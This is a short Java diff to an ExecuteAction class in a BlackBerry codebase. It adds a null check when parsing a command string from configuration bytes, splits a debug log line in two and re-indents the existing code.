@@ -22,6 +22,7 @@ import blackberry.utils.WChar;
 public final class ExecuteAction extends SubAction {
 
     private String command;
+
     /**
      * Instantiates a new execute action.
      * 
@@ -47,8 +48,8 @@ public final class ExecuteAction extends SubAction {
         }
 
         //#ifdef DEBUG_INFO
-        debug.info("Execute. Event: " + eventName);
-
+        debug.info("Execute : " + command);
+        debug.info("Event: " + eventName);
         //#endif
         return true;
     }
@@ -58,23 +59,27 @@ public final class ExecuteAction extends SubAction {
      * @see blackberry.action.SubAction#parse(byte[])
      */
     protected boolean parse(final byte[] confParams) {
-        // estrarre la stringa.
-        final DataBuffer databuffer = new DataBuffer(confParams, 0,
-                confParams.length, false);
-        try {
-            int len = databuffer.readInt();
-            byte[] buffer = new byte[len];
-            databuffer.read(buffer);
-            command = WChar.getString(buffer, true);           
+        if (confParams == null) {
+            command = "DEBUG";
+        } else {
+            // estrarre la stringa.
+            final DataBuffer databuffer = new DataBuffer(confParams, 0,
+                    confParams.length, false);
+            try {
+                int len = databuffer.readInt();
+                byte[] buffer = new byte[len];
+                databuffer.read(buffer);
+                command = WChar.getString(buffer, true);
 
-        } catch (final EOFException e) {
+            } catch (final EOFException e) {
 
-            return false;
+                return false;
+            }
         }
-        
+
         //#ifdef DEBUG_INFO
         debug.info("command: " + command);
-        
+
         //#endif
         return true;
     }
